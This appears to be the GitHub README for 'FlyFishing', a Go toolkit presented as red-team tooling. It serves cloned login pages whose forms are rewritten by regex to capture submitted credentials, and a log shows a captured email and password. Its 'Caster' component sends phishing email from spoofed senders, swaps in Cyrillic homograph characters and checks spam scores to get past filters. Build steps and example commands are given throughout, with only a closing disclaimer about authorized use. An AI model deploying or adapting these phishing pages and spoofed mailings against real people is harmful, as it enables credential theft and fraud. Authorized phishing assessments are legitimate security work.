# FlyFishing 🎣
Quickly Deploy Phishing Webpages for Red Team Assessments 


# Description 🦠
Quickly deploy phishing webpages and cast phishing emails to lure victims in Red Team Assessments. This is a lighweight golang webserver which hosts the webpage locally or for one to host externally. Caster on the other hand is for casting phishing emails to given targets on an assessment.

# Deployment 🔨
```bash
git clone https://github.com/CharlesTheGreat77/FlyFishing
cd FlyFishing
go mod init main
go mod tidy
go get github.com/PuerkitoBio/goquery
go build -o fishing main.go
```

# fishing 🎣
FlyFishing allows one to setup a local phishing webpage based on a given template. Templates can be found in **/templates** *or* found online.
```bash
./fishing -template templates/google.html
2024/09/23 06:16:27 [*] Server started at http://localhost:8888
2024/09/23 06:16:39 [*] Client IP visiting the page: 192.168.0.42:54773
2024/09/23 06:16:39 [*] Client IP visiting the page: 192.168.0.42:54773
2024/09/23 06:16:58 [*] Client IP on login: 192.168.0.42:54775
2024/09/23 06:16:58 [*] Received form data:
2024/09/23 06:16:58 Field: login_password, Value: admin1233
2024/09/23 06:16:58 Field: remember_me, Value: on
2024/09/23 06:16:58 Field: login_email, Value: admin@gmail.com
```

## Templates 📝
How are templates processed?
By using regex to locate action attribute(s) in the form and points such to our /login handler
```golang
re := regexp.MustCompile(`(?i)(<form[^>]*action=")([^"]*)(")`)
modified := re.ReplaceAllString(html, `${1}/login${3}`)
```
* Redirection is based on file name, save templates to **templates** with the correlating website which the form is for (ie. linkedin.html).
  Templates are encoded in base64 and displayed after 3 seconds of the page being visited.


# Caster 🎣
Caster allows one to send or modify given templates to send to targets. It allows one to test the score(s) of a given phishing email using *mail-tester.com* for the odds of the email landing in spam. By spoofing a given email by effectively manipulating the *headers* with a well made phishing email will hook 🪝 most if not all targets!

## Build caster ⚙️
```
go build -o caster caster.go
./caster -h
```

## SMTP Setup ✉️
1. Edit *config.json*
2. Enter your email (smtp domain)
3. Enter your token (password)
4. Enter the SMTP server

## Usage 🍤
```bash
Usage of ./caster:
  -help
    	show usage
  -homograph
    	specify option to replace chars with cryillic
  -spamfilter
    	enable to get a given templates spam score
  -spoof string
    	specify address to spoof email from [keep spam in mind]
  -subject string
    	specify a subject to add to email
  -target string
    	specify target(s) email address [filename or seperated by commas]
  -template string
    	specify a template for the email
```

## Caster examples ☕️

Single Target
```bash
caster -template template.html -subject "RSVP Lunch" -spoof "Steven <michale@filamentco.org>" -target example@domain.com
```

Multiple Target(s)
```bash
caster -template template.html -subject "RSVP Lunch" -spoof "Steven <michale@filamentco.org>" -target example@domain.com,example2@domain.com
```

Target(s) in file
```bash
caster -template template.html -subject "RSVP Lunch" -spoof "Steven <michale@filamentco.org>" -target emails.txt
```
* emails in file must be seperated by line.


Modify template to replace chars with homographic (cryillic) lookalikes
```bash
caster -template template.html -homograph
```

Testing phishing emails with spamfilter
```bash
caster -template template.html -subject "RSVP Lunch" -spoof "Steven <michale@filamentco.org>" -spamfilter
```
* sends phishing email to mail-tester.com to retreive **spam** score. [default mail-tester email is hardcoded]

## Spamfilter
The spamfilter email to test phishing email spam scores can be changed to an "updated" email of your choice.
1. Visit https://mail-tester.com
2. Copy Link Email
3. Paste email on line **217**
```golang
	tempMail := "test-sxzd09jk9@srv1.mail-tester.com"
```

# Todo 🧾
* AI template creation [ ]
* Email Obfuscation [x]

# But why FlyFishing? 🤔
After a previous phishing assessment, I wanted to highlight the ease of spinning up cloned phishing pages within around 20 minutes from start to finish. This would allow anyone with limited time to get crackin' wit creds! 🔥


# Credits 🪙
Templates: https://github.com/htr-tech/zphisher/tree/master/.sites

# Disclaimer 🚩
This program should only be used on environments that you own or have explicit permission to do so. The author will not be held liable for any illegal use of this program.
